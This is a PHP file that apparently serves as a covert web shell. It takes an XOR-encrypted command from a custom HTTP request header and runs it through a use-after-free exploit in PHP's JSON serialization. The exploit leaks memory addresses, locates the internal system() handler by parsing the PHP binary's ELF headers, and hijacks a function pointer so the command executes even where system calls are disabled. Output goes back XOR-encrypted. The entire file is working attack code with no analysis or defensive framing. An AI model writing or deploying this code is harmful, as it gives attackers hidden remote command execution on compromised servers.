<?php
header("Aizawa-Type: http_aizawa_ninja_json");

$ENCRYPTION_KEY = "AIZAWA!!!EMA";

function xor_encrypt($data, $key)
{
    $encrypted = "";
    for ($i = 0; $i < strlen($data); $i++) {
        $encrypted .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return bin2hex($encrypted);
}

function xor_decrypt($encrypted_hex, $key)
{
    $encrypted = "";
    $length = strlen($encrypted_hex);

    for ($i = 0; $i < $length; $i += 2) {
        $encrypted .= chr(hexdec(substr($encrypted_hex, $i, 2)));
    }

    $decrypted = "";
    for ($i = 0; $i < strlen($encrypted); $i++) {
        $decrypted .= chr(ord($encrypted[$i]) ^ ord($key[$i % strlen($key)]));
    }

    return $decrypted;
}

$encrypted_cmd = $_SERVER["HTTP_AIZAWA_NINJA"];
$cmd = xor_decrypt($encrypted_cmd, $ENCRYPTION_KEY);

$n_alloc = 10;

class MySplFixedArray extends SplFixedArray
{
    public static $leak;
}

class Z implements JsonSerializable
{
    public function write(&$str, $p, $v, $n = 8)
    {
        $i = 0;
        for ($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    public function str2ptr(&$str, $p = 0, $s = 8)
    {
        $address = 0;
        for ($j = $s - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8)
    {
        $out = "";
        for ($i = 0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    public function leak1($addr)
    {
        global $spl1;

        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    public function leak2($addr, $p = 0, $s = 8)
    {
        global $spl1, $fake_tbl_off;

        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef);
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10);
        $this->write($this->abc, $fake_tbl_off + 0x20, 6);

        $leak = strlen($spl1::$leak);
        if ($s != 8) {
            $leak %= 2 << $s * 8 - 1;
        }

        return $leak;
    }

    public function parse_elf($base)
    {
        $e_type = $this->leak2($base, 0x10, 2);

        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);

        for ($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);

            if ($p_type == 1 && $p_flags == 6) {
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } elseif ($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }

        if (!$data_addr || !$text_size || !$data_size) {
            return false;
        }

        return [$data_addr, $text_size, $data_size];
    }

    public function get_basic_funcs($base, $elf)
    {
        list($data_addr, $text_size, $data_size) = $elf;
        for ($i = 0; $i < $data_size / 8; $i++) {
            $leak = $this->leak2($data_addr, $i * 8);
            if ($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                if ($deref != 0x746e6174736e6f63) {
                    continue;
                }
            } else {
                continue;
            }

            $leak = $this->leak2($data_addr, ($i + 4) * 8);
            if ($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = $this->leak2($leak);
                if ($deref != 0x786568326e6962) {
                    continue;
                }
            } else {
                continue;
            }

            return $data_addr + $i * 8;
        }
    }

    public function get_binary_base($binary_leak)
    {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for ($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = $this->leak2($addr, 0, 7);
            if ($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    public function get_system($basic_funcs)
    {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->leak2($addr);
            $f_name = $this->leak2($f_entry, 0, 6);

            if ($f_name == 0x6d6574737973) {
                return $this->leak2($addr + 8);
            }
            $addr += 0x20;
        } while ($f_entry != 0);
        return false;
    }

    public function jsonSerialize()
    {
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for ($i = 0; $i < $n_alloc; $i++) {
            $contiguous[] = new DateInterval("PT1S");
        }

        $room = [];
        for ($i = 0; $i < $n_alloc; $i++) {
            $room[] = new Z();
        }

        $_protector = $this->ptr2str(0, 78);

        $this->abc = $this->ptr2str(0, 79);
        $p = new DateInterval("PT1S");

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval("PT1S");
        $x->d = 0x2000;
        $x->h = 0xdeadbeef;

        if ($this->str2ptr($this->abc) != 0xdeadbeef) {
            die("UAF failed.");
        }

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        $class_entry = $this->str2ptr($this->abc, 0x120);
        $handlers = $this->str2ptr($this->abc, 0x128);
        $php_heap = $this->str2ptr($this->abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        $fake_obj = $abc_addr;
        $this->write($this->abc, 0, 2);
        $this->write($this->abc, 0x120, $abc_addr);

        for ($i = 0; $i < 16; $i++) {
            $this->write(
                $this->abc,
                0x10 + $i * 8,
                $this->leak1($class_entry + 0x10 + $i * 8)
            );
        }

        $fake_tbl_off = 0x70 * 4 - 16;
        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);

        $this->write(
            $this->abc,
            $fake_tbl_off,
            $abc_addr + $fake_tbl_off + 0x10
        );
        $this->write($this->abc, $fake_tbl_off + 8, 10);

        $binary_leak = $this->leak2($handlers + 0x10);
        if (!($base = $this->get_binary_base($binary_leak))) {
            die("Couldn't determine binary base address");
        }

        if (!($elf = $this->parse_elf($base))) {
            die("Couldn't parse ELF");
        }

        if (!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
            die("Couldn't get basic_functions address");
        }

        if (!($zif_system = $this->get_system($basic_funcs))) {
            die("Couldn't get zif_system address");
        }

        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this->str2ptr($this->abc, 0x50);
        for ($i = 0; $i < 4; $i++) {
            $this->write(
                $this->abc,
                $fake_bkt_off + $i * 8,
                $this->leak2($function_data + 0x40 * 4, $i * 8)
            );
        }

        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this->write($this->abc, 0x50, $fake_bkt_addr);
        for ($i = 0; $i < 3; $i++) {
            $this->write($this->abc, 0x58 + $i * 4, 1, 4);
        }

        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
        for ($i = 0; $i < 12; $i++) {
            $this->write(
                $this->abc,
                $fake_bkt_off + 0x70 + $i * 8,
                $this->leak2($function_zval, $i * 8)
            );
        }

        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);

        $spl1->offsetGet($cmd);

        exit();
    }
}

$y = [new Z()];
echo xor_encrypt(json_encode([&$y]), $ENCRYPTION_KEY);
